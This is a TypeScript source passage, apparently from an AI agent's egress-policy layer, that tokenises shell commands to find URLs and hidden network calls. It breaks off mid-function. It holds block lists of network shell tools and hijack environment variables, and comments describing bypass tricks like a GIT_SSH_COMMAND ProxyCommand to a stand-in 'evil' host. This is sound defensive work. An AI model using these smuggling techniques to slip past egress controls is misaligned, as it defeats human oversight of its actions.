/**
 * URL Extraction Utilities
 *
 * Extracts URLs from text, objects, and shell commands.
 * Used for security policy enforcement and content analysis.
 *
 * ## Features
 *
 * - Recursive extraction from nested objects/arrays
 * - Shell command parsing (curl, wget)
 * - Automatic http:// prefix for bare hostnames
 * - Trailing punctuation cleanup
 *
 * @module utils/url-extractor
 */

/**
 * Pattern to match HTTP/HTTPS URLs in text.
 */
const URL_PATTERN = /https?:\/\/[^\s"'<>]+/gi;

/**
 * Commands that can initiate network egress from shell tool calls.
 */
const NETWORK_COMMANDS = new Set([
	"aria2c",
	"curl",
	"ftp",
	"git",
	"http",
	"https",
	"nc",
	"ncat",
	"netcat",
	"rsync",
	"scp",
	"sftp",
	"ssh",
	"telnet",
	"wget",
	"wget2",
]);

const URL_POSITIONAL_COMMANDS = new Set([
	"aria2c",
	"curl",
	"http",
	"https",
	"wget",
	"wget2",
]);

const NETWORK_WRAPPER_COMMANDS = new Set([
	"busybox",
	"command",
	"doas",
	"env",
	"exec",
	"nice",
	"nohup",
	"setsid",
	"sudo",
	"time",
	"timeout",
	"xargs",
]);

const SHELL_WRAPPER_COMMANDS = new Set([
	"bash",
	"dash",
	"fish",
	"ksh",
	"mksh",
	"sh",
	"zsh",
	// `script(1)` records a typescript but also runs the `-c COMMAND`
	// (or `--command COMMAND`) argument inside a subshell. Treating it as
	// a shell wrapper so `script -qc 'ssh -o ProxyCommand=...'` still
	// reaches the opaque-options matcher.
	"script",
]);

// Indirection class: commands that hand a string off to a language runtime
// or another shell so an attacker can hide the network call from the parser.
//
// `eval` is unconditionally opaque — its whole purpose is "interpret this
// string as code at runtime."
const EVAL_COMMANDS = new Set(["eval"]);

// POSIX/Bourne-family shells that read a command body. When the body is a
// static string the existing nested-shell parser recurses into it; but a
// bare interpreter (pipe target), a `-c` argument with shell expansion
// (`bash -c "$CMD"`), a here-string (`bash <<<`), or a positional script
// path are all unparseable from here and treated as opaque.
const SHELL_INTERPRETERS = new Set([
	"ash",
	"bash",
	"dash",
	"fish",
	"ksh",
	"mksh",
	"sh",
	// `script(1)` records typescript output but executes its `-c` body
	// inside a real shell. The body-detection logic in
	// `shellInterpreterIsOpaque` (`-c` / `--command` / `-qc`) applies
	// to `script` identically — without this, `script -c "$CMD"
	// /tmp/log` slips past pass 2.
	"script",
	"zsh",
]);

// Language interpreters and the flag that runs an inline code string. We
// cannot parse Python/Node/Perl/Ruby/PHP — so when the eval/exec flag is
// present we look at the code argument for either shell expansion (we
// cannot resolve its value) or a network-relevant token (`ssh`,
// `requests.get`, `urlopen`, `os.system`, …). Either is opaque.
const LANGUAGE_EVAL_EXEC_FLAGS: ReadonlyMap<
	string,
	ReadonlySet<string>
> = new Map([
	["python", new Set(["-c"])],
	["python2", new Set(["-c"])],
	["python3", new Set(["-c"])],
	["node", new Set(["-e", "--eval", "-p", "--print"])],
	["nodejs", new Set(["-e", "--eval", "-p", "--print"])],
	["deno", new Set(["eval"])],
	["bun", new Set(["-e", "--eval"])],
	["perl", new Set(["-e", "-E"])],
	["ruby", new Set(["-e"])],
	["php", new Set(["-r"])],
]);

// Substring patterns inside a language `-c` / `-e` code body that imply
// the interpreted code may make a network request. Lower-cased; matched
// case-insensitively. The list errs on the side of catching outbound
// transport calls; if a benign script trips it, the user can refactor
// the command to not embed a code string.
const NETWORK_KEYWORD_PATTERN =
	/\b(?:ssh|scp|sftp|rsync|curl|wget|telnet|ftp|smb|nfs|imap|smtp|pop3|requests\.|urllib|urlopen|httplib|http\.client|fetch\(|axios|node-fetch|undici|got\(|net::http|net::ssh|net::scp|socket\.|os\.system|os\.popen|subprocess|child_process|exec\(|spawn\(|popen\(|net\.connect|tls\.connect|dgram\.|smtplib|paramiko|fabric|file_get_contents|fsockopen|stream_socket_client|curl_exec|curl_init|fopen|file\(\s*['"]https?)\b|require\(\s*['"](?:https?|net|tls|dgram|dns|http2|child_process)['"]|(?:import|from)\s*['"](?:https?|net|tls|dgram|dns|http2|child_process|node:(?:https?|net|tls|dgram|dns|http2|child_process))['"]/i;

const SHELL_HEREDOC_TOKENS = new Set(["<<<", "<<", "<<-"]);

function hasShellExpansionToken(arg: string): boolean {
	// `$VAR`, `${VAR}`, `$(...)`, and backtick command substitution all
	// resolve at runtime — the parser cannot know the value, so any code
	// body containing one must be treated as opaque.
	return arg.includes("$") || arg.includes("`");
}

// Resolve the code body for a language interpreter eval/exec flag,
// across the three argv forms an attacker can use:
//
//   * `python -c CODE`            (exact match + next argv slot)
//   * `python -c'CODE'`           (glued short flag, quotes elided by shell)
//   * `node --eval=CODE`          (`=` form for long flags)
//
// Returns the code string, or null if `arg` is not a recognized form.
// Empty string is treated as "no body" by the caller — a dangling
// `python -c` errors at the interpreter, not a network bypass.
function extractEvalCodeBody(
	arg: string,
	nextArg: string | undefined,
	flags: ReadonlySet<string>,
): string | null {
	if (flags.has(arg)) {
		return nextArg ?? null;
	}
	for (const flag of flags) {
		// Glued short form: `python -c'…'` becomes one token `-c…` after
		// the shell removes the quotes. Only meaningful when the flag is
		// itself a single-char short flag (`-c`, `-e`, `-E`, `-r`, `-p`).
		if (
			flag.length === 2 &&
			flag.startsWith("-") &&
			!flag.startsWith("--") &&
			arg.startsWith(flag) &&
			arg.length > flag.length
		) {
			return arg.slice(flag.length);
		}
		// `=` form for long flags: `--eval=…`, `--print=…`.
		if (flag.startsWith("--") && arg.startsWith(`${flag}=`)) {
			return arg.slice(flag.length + 1);
		}
	}
	return null;
}

function shellInterpreterIsOpaque(segment: string[]): boolean {
	// `… | sh`, `… | bash` — the interpreter reads from stdin (or is
	// being launched interactively). Either way the body is invisible.
	if (segment.length === 1) {
		return true;
	}

	let index = 1;
	let sawStaticC = false;
	while (index < segment.length) {
		const arg = segment[index]!;

		if (SHELL_HEREDOC_TOKENS.has(arg)) {
			return true;
		}

		const commandArg = extractShellCommandArg(segment, index);
		if (commandArg) {
			if (
				commandArg.command !== null &&
				hasShellExpansionToken(commandArg.command)
			) {
				return true;
			}
			if (commandArg.command !== null) {
				sawStaticC = true;
			}
			index += commandArg.consumedArgs;
			continue;
		}

		// `--init-file=$EVIL`, `--rcfile=$EVIL`, `-rcfile=$EVIL`: bash
		// will read code from a caller-controlled file path. Expansion
		// in the path means we can't know which file — opaque.
		if (
			arg.startsWith("--init-file=") ||
			arg.startsWith("--rcfile=") ||
			arg.startsWith("-rcfile=")
		) {
			const path = arg.slice(arg.indexOf("=") + 1);
			if (hasShellExpansionToken(path)) {
				return true;
			}
			index += 1;
			continue;
		}

		if (SHELL_FLAGS_WITH_VALUES.has(arg)) {
			// `bash --rcfile $EVIL` (space-separated value form). Same
			// risk as the `=` form when the value itself expands.
			const value = segment[index + 1];
			if (
				value !== undefined &&
				(arg === "--rcfile" || arg === "-rcfile" || arg === "--init-file") &&
				hasShellExpansionToken(value)
			) {
				return true;
			}
			index += 2;
			continue;
		}

		if (arg.startsWith("-") || arg.startsWith("+")) {
			index += 1;
			continue;
		}

		// Positional argument before a -c body: script path. We cannot
		// read its content, so this invocation is opaque.
		if (!sawStaticC) {
			return true;
		}

		// After a static -c body, positionals are just $0/$1/... — the
		// parser has already recursed into the body, so they don't make
		// the segment opaque.
		break;
	}

	return false;
}

// Walk past env-var prefixes and exec-wrappers (`env`, `sudo`, `doas`,
// `nohup`, `busybox`, …) to the underlying invocation. Mirrors the
// prefix-stripping in `unwrapNetworkInvocation`, but emits the
// unwrapped segment whether or not the inner command is a recognized
// network/shell name — the caller's job is to classify it.
function stripIndirectionWrappers(segment: string[]): string[] {
	let remaining = segment;
	while (remaining.length > 0 && isEnvAssignment(remaining[0]!)) {
		remaining = remaining.slice(1);
	}
	while (remaining.length > 0) {
		const head = shellCommandName(remaining[0] ?? "");
		if (!NETWORK_WRAPPER_COMMANDS.has(head)) {
			break;
		}
		if (commandWrapperDoesNotExecute(remaining)) {
			break;
		}
		remaining = skipWrapperArgs(remaining, head);
	}
	return remaining;
}

function findOpaqueIndirection(segment: string[]): string | null {
	if (segment.length === 0) {
		return null;
	}

	// Strip wrappers so `env bash -c "$CMD"`, `sudo bash -c "$CMD"`,
	// `busybox sh -c "$CMD"` all reach the shell-interpreter check
	// instead of seeing `env` / `sudo` / `busybox` as the leading
	// command and bailing.
	const unwrapped = stripIndirectionWrappers(segment);
	if (unwrapped.length === 0) {
		return null;
	}

	const commandName = shellCommandName(unwrapped[0] ?? "");

	if (EVAL_COMMANDS.has(commandName)) {
		return segment.join(" ");
	}

	if (
		SHELL_INTERPRETERS.has(commandName) &&
		shellInterpreterIsOpaque(unwrapped)
	) {
		return segment.join(" ");
	}

	const evalFlags = LANGUAGE_EVAL_EXEC_FLAGS.get(commandName);
	if (evalFlags) {
		for (let i = 1; i < unwrapped.length; i += 1) {
			const arg = unwrapped[i] ?? "";
			const code = extractEvalCodeBody(arg, unwrapped[i + 1], evalFlags);
			if (code === null || code === "") {
				continue;
			}
			if (hasShellExpansionToken(code) || NETWORK_KEYWORD_PATTERN.test(code)) {
				return segment.join(" ");
			}
		}
	}

	return null;
}

const SHELL_FLAGS_WITH_VALUES = new Set([
	"--init-file",
	"--rcfile",
	"-rcfile",
	"-o",
	"+o",
	"-O",
	"+O",
]);
const SHELL_SHORT_FLAGS_BEFORE_COMMAND = new Set([
	"a",
	"b",
	"e",
	"f",
	"h",
	"i",
	"k",
	"l",
	"m",
	"n",
	"p",
	"q", // script(1) quiet
	"r",
	"s",
	"t",
	"u",
	"v",
	"x",
	"B",
	"C",
	"D",
	"E",
	"H",
	"P",
]);
const EXEC_WRAPPER_FLAGS_WITH_VALUES = new Set(["-a"]);

const NETWORK_GIT_SUBCOMMANDS = new Set([
	"archive",
	"clone",
	"config",
	"fetch",
	"ls-remote",
	"pull",
	"push",
	"remote",
	"submodule",
]);

const GIT_NESTED_SUBCOMMAND_WRAPPERS = new Set(["lfs", "svn"]);

const GIT_GLOBAL_FLAGS_WITH_VALUES = new Set([
	"-C",
	"-c",
	"--config-env",
	"--exec-path",
	"--git-dir",
	"--namespace",
	"--super-prefix",
	"--work-tree",
]);

const GIT_CLONE_FLAGS_WITH_VALUES = new Set([
	"-b",
	"--branch",
	"-c",
	"--config",
	"--bundle-uri",
	"--depth",
	"--filter",
	"-j",
	"--jobs",
	"-o",
	"--origin",
	"--reference",
	"--reference-if-able",
	"--separate-git-dir",
	"--server-option",
	"--shallow-exclude",
	"--shallow-since",
	"--template",
	"-u",
	"--upload-pack",
]);

const GIT_REMOTE_ADD_FLAGS_WITH_VALUES = new Set([
	"-m",
	"--master",
	"-t",
	"--track",
]);

const GIT_CONFIG_FLAGS_WITH_VALUES = new Set([
	"-f",
	"--blob",
	"--comment",
	"--default",
	"--file",
	"--fixed-value",
	"--type",
	"--value",
]);

const GIT_REMOTE_LOCAL_ACTIONS = new Set([
	"get-url",
	"prune",
	"remove",
	"rename",
	"rm",
	"set-branches",
	"set-head",
]);

const GIT_SUBMODULE_ADD_FLAGS_WITH_VALUES = new Set([
	"-b",
	"--branch",
	"--depth",
	"--name",
	"--reference",
]);

const GIT_SUBMODULE_LOCAL_ACTIONS = new Set([
	"absorbgitdirs",
	"deinit",
	"init",
	"set-branch",
	"status",
	"summary",
	"sync",
]);

// rsync(1) reuses many short flags with different meanings than curl/ssh
// (e.g. `-i` is `--itemize-changes`, `-o` is `--owner`, `-H` is
// `--hard-links` — all booleans, not value-taking). Without a dedicated
// set, the generic `FLAGS_WITH_VALUES` table treats them as value-taking
// and silently consumes the next positional, which is frequently the
// `user@host:path` remote — the bypass Cursor Bugbot flagged on PR
// #2732. This list mirrors the rsync(1) flags that actually take the
// next arg.
const RSYNC_FLAGS_WITH_VALUES = new Set([
	"-B",
	"--block-size",
	"-e",
	"--rsh",
	"-f",
	"--filter",
	"-M",
	"--remote-option",
	"-T",
	"--temp-dir",
	"--address",
	"--backup-dir",
	"--bwlimit",
	"--checksum-choice",
	"--chmod",
	"--chown",
	"--compare-dest",
	"--compress-choice",
	"--compress-level",
	"--contimeout",
	"--copy-as",
	"--copy-dest",
	"--debug",
	"--exclude",
	"--exclude-from",
	"--files-from",
	"--groupmap",
	"--iconv",
	"--include",
	"--include-from",
	"--info",
	"--link-dest",
	"--log-file",
	"--log-file-format",
	"--max-alloc",
	"--max-size",
	"--min-size",
	"--modify-window",
	"--only-write-batch",
	"--out-format",
	"--partial-dir",
	"--password-file",
	"--port",
	"--protocol",
	"--read-batch",
	"--rsync-path",
	"--skip-compress",
	"--sockopts",
	"--stderr",
	"--suffix",
	"--timeout",
	"--usermap",
	"--write-batch",
]);

// Flags that take a value as the next argument.
const FLAGS_WITH_VALUES = new Set([
	"-X",
	"--request",
	"-o",
	"-O",
	"--output",
	"-H",
	"--header",
	"-d",
	"--data",
	"--data-raw",
	"--data-binary",
	"--data-urlencode",
	"-F",
	"--form",
	"-A",
	"--user-agent",
	"-u",
	"--user",
	"-T",
	"--upload-file",
	"-e",
	"--referer",
	"-b",
	"--cookie",
	"-c",
	"--cookie-jar",
	"-K",
	"--config",
	"--resolve",
	"--connect-to",
	"--max-time",
	"-m",
	"--retry",
	"--retry-delay",
	"-w",
	"--write-out",
	"-p",
	"--port",
	"-i",
	"--identity-file",
]);

const ENV_WRAPPER_FLAGS_WITH_VALUES = new Set(["-u", "--unset"]);

const NICE_WRAPPER_FLAGS_WITH_VALUES = new Set(["-n", "--adjustment"]);

const DOAS_WRAPPER_FLAGS_WITH_VALUES = new Set(["-C", "-u"]);

const SUDO_WRAPPER_FLAGS_WITH_VALUES = new Set([
	"-C",
	"--close-from",
	"-g",
	"--group",
	"-h",
	"--host",
	"-p",
	"--prompt",
	"-T",
	"--command-timeout",
	"-u",
	"--user",
]);

const TIMEOUT_WRAPPER_FLAGS_WITH_VALUES = new Set([
	"-k",
	"--kill-after",
	"-s",
	"--signal",
]);

const XARGS_WRAPPER_FLAGS_WITH_VALUES = new Set([
	"-a",
	"--arg-file",
	"-d",
	"--delimiter",
	"-E",
	"--eof",
	"-e",
	"--eof-str",
	"-I",
	"--replace",
	"-i",
	"-L",
	"--max-lines",
	"-l",
	"-n",
	"--max-args",
	"-P",
	"--max-procs",
	"-s",
	"--max-chars",
]);

interface ShellToken {
	value: string;
	separator: boolean;
}

function cleanExtractedUrl(url: string): string {
	const trailingPunctuation = url.includes("://[")
		? /[)},.;:]+$/
		: /[)}\],.;:]+$/;
	return url.replace(trailingPunctuation, "");
}

function shellCommandName(token: string): string {
	const base = token.replace(/\\/g, "").split("/").pop() ?? token;
	return base.toLowerCase();
}

function isEnvAssignment(token: string): boolean {
	return /^[A-Za-z_][A-Za-z0-9_]*=/.test(token);
}

function envAssignmentName(token: string): string | null {
	const match = token.match(/^([A-Za-z_][A-Za-z0-9_]*)=/);
	return match ? match[1]! : null;
}

// Bare env-var prefixes (`VAR=value VAR2=value cmd args`) that set
// dangerous variables for the subsequent command. The bot-flagged
// canonical case is
// `GIT_SSH_COMMAND='ssh -o ProxyCommand=nc evil 22' git clone …`:
// the parser then sees `git clone github.com:o/r`, extracts
// github.com, and the policy allows the command — but the actual
// SSH transport is the attacker-supplied `nc evil 22` command, not
// real ssh. We treat any non-empty assignment to one of these
// variables as opaque, the same way we treat ssh `-o ProxyCommand=`.
const OPAQUE_ENV_VAR_NAMES = new Set([
	// Tool-specific transport overrides.
	"GIT_SSH",
	"GIT_SSH_COMMAND",
	"GIT_PROXY_COMMAND",
	"RSYNC_RSH",
	"CVS_RSH",
	// Library/loader hijacks. Setting these inline is almost always
	// an attempt to intercept the subsequent process.
	"LD_PRELOAD",
	"LD_LIBRARY_PATH",
	"LD_AUDIT",
	"DYLD_INSERT_LIBRARIES",
	"DYLD_LIBRARY_PATH",
	"DYLD_FALLBACK_LIBRARY_PATH",
	// Shell startup-hijacks.
	"BASH_ENV",
	"ENV",
	"PROMPT_COMMAND",
	// curl / wget config overrides via env.
	"CURL_HOME",
	"WGETRC",
]);

function findOpaqueEnvAssignment(segment: string[]): string | null {
	for (const token of segment) {
		if (!isEnvAssignment(token)) {
			// We've passed the env-prefix region; anything after is the
			// command itself, which is handled elsewhere.
			return null;
		}
		const name = envAssignmentName(token);
		if (name && OPAQUE_ENV_VAR_NAMES.has(name)) {
			const value = token.slice(name.length + 1);
			if (value !== "") {
				return `${name}=${value}`;
			}
		}
	}
	return null;
}

function wrapperFlagTakesValue(commandName: string, flag: string): boolean {
	if (commandName === "env") {
		return ENV_WRAPPER_FLAGS_WITH_VALUES.has(flag);
	}
	if (commandName === "exec") {
		return EXEC_WRAPPER_FLAGS_WITH_VALUES.has(flag);
	}
	if (commandName === "nice") {
		return NICE_WRAPPER_FLAGS_WITH_VALUES.has(flag);
	}
	if (commandName === "doas") {
		return DOAS_WRAPPER_FLAGS_WITH_VALUES.has(flag);
	}
	if (commandName === "sudo") {
		return SUDO_WRAPPER_FLAGS_WITH_VALUES.has(flag);
	}
	if (commandName === "timeout") {
		return TIMEOUT_WRAPPER_FLAGS_WITH_VALUES.has(flag);
	}
	if (commandName === "xargs") {
		return XARGS_WRAPPER_FLAGS_WITH_VALUES.has(flag);
	}
	return false;
}

function commandWrapperDoesNotExecute(segment: string[]): boolean {
	if (shellCommandName(segment[0] ?? "") !== "command") {
		return false;
	}

	for (let index = 1; index < segment.length; index += 1) {
		const arg = segment[index]!;
		if (arg === "--") {
			return false;
		}
		if (!arg.startsWith("-") || arg === "-") {
			return false;
		}
		if (arg === "-v" || arg === "-V") {
			return true;
		}
		if (!arg.startsWith("--") && /[vV]/.test(arg.slice(1))) {
			return true;
		}
	}

	return false;
}

function tokenizeShellCommand(command: string): ShellToken[] {
	const tokens: ShellToken[] = [];
	let current = "";
	let quote: "'" | '"' | null = null;
	let escaped = false;

	const pushCurrent = () => {
		if (current.length > 0) {
			tokens.push({ value: current, separator: false });
			current = "";
		}
	};

	for (let index = 0; index < command.length; index += 1) {
		const char = command[index]!;

		if (escaped) {
			current += char;
			escaped = false;
			continue;
		}

		if (char === "\\") {
			escaped = true;
			continue;
		}

		if (quote) {
			if (char === quote) {
				quote = null;
			} else {
				current += char;
			}
			continue;
		}

		if (char === "'" || char === '"') {
			quote = char;
			continue;
		}

		// Treat `\n` and `\r` as command separators (equivalent to `;`).
		// bash splits on newlines the same way it splits on `;` —
		// `echo hi\nssh user@evil.com` runs two commands. Without this
		// the parser folded both into one giant non-network command and
		// the SSH leg slipped past the allowlist gate.
		if (char === "\n" || char === "\r") {
			pushCurrent();
			tokens.push({ value: char, separator: true });
			continue;
		}

		if (/\s/.test(char)) {
			pushCurrent();
			continue;
		}

		if (char === ";" || char === "&" || char === "|") {
			pushCurrent();
			const next = command[index + 1];
			if ((char === "&" || char === "|") && next === char) {
				tokens.push({ value: `${char}${next}`, separator: true });
				index += 1;
			} else {
				tokens.push({ value: char, separator: true });
			}
			continue;
		}

		current += char;
	}

	if (escaped) {
		current += "\\";
	}
	pushCurrent();

	return tokens;
}

function commandSegments(tokens: ShellToken[]): string[][] {
	const segments: string[][] = [];
	let current: string[] = [];

	for (const token of tokens) {
		if (token.separator) {
			if (current.length > 0) {
				segments.push(current);
				current = [];
			}
			continue;
		}
		current.push(token.value);
	}

	if (current.length > 0) {
		segments.push(current);
	}

	return segments;
}

function skipWrapperArgs(segment: string[], commandName: string): string[] {
	let index = 1;
	while (index < segment.length) {
		const arg = segment[index]!;
		if (arg === "--") {
			index += 1;
			break;
		}
		if (commandName === "env" && isEnvAssignment(arg)) {
			index += 1;
			continue;
		}
		if (!arg.startsWith("-")) {
			break;
		}
		const [flag] = arg.split("=", 1);
		index += 1;
		if (
			flag &&
			wrapperFlagTakesValue(commandName, flag) &&
			!arg.includes("=") &&
			index < segment.length
		) {
			index += 1;
		}
	}

	if (commandName === "timeout" && index < segment.length) {
		index += 1;
	}

	return segment.slice(index);
}

function extractShellCommandArg(
	segment: string[],
	index: number,
): { command: string | null; consumedArgs: number } | null {
	const arg = segment[index]!;

	if (arg === "--command") {
		return {
			command: segment[index + 1] ?? null,
			consumedArgs: segment[index + 1] === undefined ? 1 : 2,
		};
	}
	if (arg.startsWith("--command=")) {
		return {
			command: arg.slice("--command=".length) || null,
			consumedArgs: 1,
		};
	}
	if (
		SHELL_FLAGS_WITH_VALUES.has(arg) ||
		arg.startsWith("--init-file=") ||
		arg.startsWith("--rcfile=") ||
		arg.startsWith("-rcfile=")
	) {
		return null;
	}
	if (!arg.startsWith("-") || arg.startsWith("--")) {
		return null;
	}

	const commandFlagIndex = arg.indexOf("c", 1);
	if (
		commandFlagIndex === -1 ||
		commandFlagIndex > 5 ||
		![...arg.slice(1, commandFlagIndex)].every((flag) =>
			SHELL_SHORT_FLAGS_BEFORE_COMMAND.has(flag),
		)
	) {
		return null;
	}

	const gluedCommand = arg.slice(commandFlagIndex + 1);
	return {
		command:
			gluedCommand.length > 1 ? gluedCommand : (segment[index + 1] ?? null),
		consumedArgs:
			gluedCommand.length > 1 || segment[index + 1] === undefined ? 1 : 2,
	};
}

function extractShellCommandString(segment: string[]): string | null {
	for (let index = 1; index < segment.length; index += 1) {
		const arg = segment[index]!;
		if (arg === "--") {
			return null;
		}
		const commandArg = extractShellCommandArg(segment, index);
		if (commandArg) {
			return commandArg.command;
		}
		if (SHELL_FLAGS_WITH_VALUES.has(arg)) {
			index += 1;
			continue;
		}
		if (
			arg.startsWith("--init-file=") ||
			arg.startsWith("--rcfile=") ||
			arg.startsWith("-rcfile=")
		) {
			continue;
		}
		if (!arg.startsWith("-")) {
			return null;
		}
	}

	return null;
}

function extractNestedShellCommand(segment: string[]): string | null {
	let remaining = segment;

	while (remaining.length > 0) {
		const commandName = shellCommandName(remaining[0] ?? "");
		if (SHELL_WRAPPER_COMMANDS.has(commandName)) {
			return extractShellCommandString(remaining);
		}

		if (!NETWORK_WRAPPER_COMMANDS.has(commandName)) {
			return null;
		}

		if (commandWrapperDoesNotExecute(remaining)) {
			return null;
		}

		remaining = skipWrapperArgs(remaining, commandName);
	}

	return null;
}

function findParenthesizedCommandEnd(
	command: string,
	startIndex: number,
	startOffset = 1,
): number {
	let depth = 1;
	let quote: "'" | '"' | null = null;
	let escaped = false;

	for (
		let index = startIndex + startOffset;
		index < command.length;
		index += 1
	) {
		const char = command[index]!;

		if (escaped) {
			escaped = false;
			continue;
		}

		if (char === "\\") {
			escaped = true;
			continue;
		}

		if (quote === "'") {
			if (char === "'") {
				quote = null;
			}
			continue;
		}

		if (quote === '"') {
			if (char === '"') {
				quote = null;
				continue;
			}
			if (
				char === "$" &&
				command[index + 1] === "(" &&
				command[index + 2] !== "("
			) {
				depth += 1;
				index += 1;
			}
			continue;
		}

		if (char === "'" || char === '"') {
			quote = char;
			continue;
		}

		if (
			char === "$" &&
			command[index + 1] === "(" &&
			command[index + 2] !== "("
		) {
			depth += 1;
			index += 1;
			continue;
		}

		if (char === "(") {
			depth += 1;
			continue;
		}

		if (char === ")") {
			depth -= 1;
			if (depth === 0) {
				return index;
			}
		}
	}

	return -1;
}

function findCommandSubstitutionEnd(
	command: string,
	startIndex: number,
): number {
	return findParenthesizedCommandEnd(command, startIndex, 2);
}

function extractSubshellCommands(command: string): string[] {
	const commands: string[] = [];
	let quote: "'" | '"' | null = null;
	let escaped = false;

	const startsAfterShellBoundary = (index: number): boolean => {
		for (let current = index - 1; current >= 0; current -= 1) {
			const value = command[current];
			if (value === "\n" || value === "\r") {
				return true;
			}
			if (value && !/\s/.test(value)) {
				return value === ";" || value === "&" || value === "|" || value === "(";
			}
		}
		return true;
	};

	for (let index = 0; index < command.length; index += 1) {
		const char = command[index]!;

		if (escaped) {
			escaped = false;
			continue;
		}

		if (char === "\\") {
			escaped = true;
			continue;
		}

		if (quote === "'") {
			if (char === "'") {
				quote = null;
			}
			continue;
		}

		if (quote === '"') {
			if (char === '"') {
				quote = null;
			}
			continue;
		}

		if (char === "'" || char === '"') {
			quote = char;
			continue;
		}

		const isProcessSubstitution =
			command[index - 1] === "<" || command[index - 1] === ">";
		if (
			char === "(" &&
			command[index - 1] !== "$" &&
			command[index + 1] !== "(" &&
			(isProcessSubstitution || startsAfterShellBoundary(index))
		) {
			const endIndex = findParenthesizedCommandEnd(command, index);
			if (endIndex !== -1) {
				const nested = command.slice(index + 1, endIndex).trim();
				if (nested) {
					commands.push(nested);
				}
				index = endIndex;
			}
		}
	}

	return commands;
}

function extractFindExecSegments(segment: string[]): string[][] {
	const commands: string[][] = [];

	for (let index = 1; index < segment.length; index += 1) {
		const arg = segment[index]!;
		if (
			arg !== "-exec" &&
			arg !== "-execdir" &&
			arg !== "-ok" &&
			arg !== "-okdir"
		) {
			continue;
		}

		const start = index + 1;
		let end = start;
		while (end < segment.length) {
			const token = segment[end]!;
			if (token === ";" || token === "+") {
				break;
			}
			end += 1;
		}

		if (end > start) {
			commands.push(segment.slice(start, end));
		}
		index = end;
	}

	return commands;
}

function extractEmbeddedCommandSegments(segment: string[]): string[][] {
	let remaining = segment;

	while (remaining.length > 0) {
		const commandName = shellCommandName(remaining[0] ?? "");
		if (commandName === "find") {
			return extractFindExecSegments(remaining);
		}
		if (!NETWORK_WRAPPER_COMMANDS.has(commandName)) {
			return [];
		}
		if (commandWrapperDoesNotExecute(remaining)) {
			return [];
		}
		remaining = skipWrapperArgs(remaining, commandName);
	}

	return [];
}

function nestedCommandSegments(
	segment: string[],
	seen: Set<string>,
): string[][] {
	const segments: string[][] = [];
	const nestedShell = extractNestedShellCommand(segment);
	if (nestedShell) {
		segments.push(...allCommandSegments(nestedShell, seen));
	}

	for (const embeddedSegment of extractEmbeddedCommandSegments(segment)) {
		segments.push(
			embeddedSegment,
			...nestedCommandSegments(embeddedSegment, seen),
		);
	}

	return segments;
}

function extractCommandSubstitutionCommands(command: string): string[] {
	const commands: string[] = [];
	let quote: "'" | '"' | null = null;
	let escaped = false;

	for (let index = 0; index < command.length; index += 1) {
		const char = command[index]!;

		if (escaped) {
			escaped = false;
			continue;
		}

		if (char === "\\") {
			escaped = true;
			continue;
		}

		if (quote === "'") {
			if (char === "'") {
				quote = null;
			}
			continue;
		}

		if (quote === '"') {
			if (char === '"') {
				quote = null;
				continue;
			}
			if (
				char === "$" &&
				command[index + 1] === "(" &&
				command[index + 2] !== "("
			) {
				const endIndex = findCommandSubstitutionEnd(command, index);
				if (endIndex !== -1) {
					const nested = command.slice(index + 2, endIndex).trim();
					if (nested) {
						commands.push(nested);
					}
					index = endIndex;
				}
			}
			if (char === "`") {
				const endIndex = command.indexOf("`", index + 1);
				if (endIndex !== -1) {
					const nested = command.slice(index + 1, endIndex).trim();
					if (nested) {
						commands.push(nested);
					}
					index = endIndex;
				}
			}
			continue;
		}

		if (char === "'" || char === '"') {
			quote = char;
			continue;
		}

		if (
			char === "$" &&
			command[index + 1] === "(" &&
			command[index + 2] !== "("
		) {
			const endIndex = findCommandSubstitutionEnd(command, index);
			if (endIndex !== -1) {
				const nested = command.slice(index + 2, endIndex).trim();
				if (nested) {
					commands.push(nested);
				}
				index = endIndex;
			}
			continue;
		}

		if (char === "`") {
			const endIndex = command.indexOf("`", index + 1);
			if (endIndex !== -1) {
				const nested = command.slice(index + 1, endIndex).trim();
				if (nested) {
					commands.push(nested);
				}
				index = endIndex;
			}
		}
	}

	return commands;
}

function allCommandSegments(
	command: string,
	seen = new Set<string>(),
): string[][] {
	if (seen.has(command)) {
		return [];
	}
	seen.add(command);

	const segments = commandSegments(tokenizeShellCommand(command));
	const nestedSegments = segments.flatMap((segment) =>
		nestedCommandSegments(segment, seen),
	);
	const substitutionSegments = extractCommandSubstitutionCommands(
		command,
	).flatMap((nested) => allCommandSegments(nested, seen));
	const subshellSegments = extractSubshellCommands(command).flatMap((nested) =>
		allCommandSegments(nested, seen),
	);

	return [
		...segments,
		...nestedSegments,
		...substitutionSegments,
		...subshellSegments,
	];
}

function unwrapNetworkInvocation(
	segment: string[],
): { commandName: string; args: string[]; display: string[] } | null {
	let remaining = segment;

	// Skip bash-style bare env-var prefixes (`VAR=value VAR2=value
	// cmd args`). Without this the parser sees `GIT_SSH_COMMAND=…` as
	// the first token, finds no network command, and bails — so
	// `GIT_SSH_COMMAND='…' git clone github.com:o/r` was undetected
	// even though it's the canonical smuggle vector. The opaque-env
	// detector (`findOpaqueEnvAssignment`) runs on the original segment
	// in `findOpaqueNetworkShellCommand` so the dangerous prefix is
	// still inspected — we just need to skip past it here so the
	// underlying command is recognized for URL extraction.
	while (remaining.length > 0 && isEnvAssignment(remaining[0]!)) {
		remaining = remaining.slice(1);
	}

	while (remaining.length > 0) {
		const commandName = shellCommandName(remaining[0] ?? "");
		if (NETWORK_COMMANDS.has(commandName)) {
			return {
				commandName,
				args: remaining.slice(1),
				display: remaining,
			};
		}

		if (!NETWORK_WRAPPER_COMMANDS.has(commandName)) {
			return null;
		}

		if (commandWrapperDoesNotExecute(remaining)) {
			return null;
		}

		remaining = skipWrapperArgs(remaining, commandName);
	}

	return null;
}

function looksLikeHostTarget(value: string): boolean {
	if (!value || value.startsWith("-")) {
		return false;
	}
	if (/^https?:\/\//i.test(value)) {
		return true;
	}
	if (/^\[[0-9a-f:.%]+\](?::\d+)?(?:\/.*)?$/i.test(value)) {
		return true;
	}
	if (/^(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?(?:\/.*)?$/.test(value)) {
		return true;
	}
	if (/^localhost(?::\d+)?(?:\/.*)?$/i.test(value)) {
		return true;
	}
	if (/^[a-z0-9.-]+\.[a-z0-9-]+(?::\d+)?(?:\/.*)?$/i.test(value)) {
		return true;
	}
	if (/^[^@\s]+@[a-z0-9.-]+\.[a-z0-9-]+(?::[^\s]+|\/.*)?$/i.test(value)) {
		return true;
	}
	return false;
}

function targetToUrl(value: string): string | null {
	let target = value.trim().replace(/^["']|["']$/g, "");
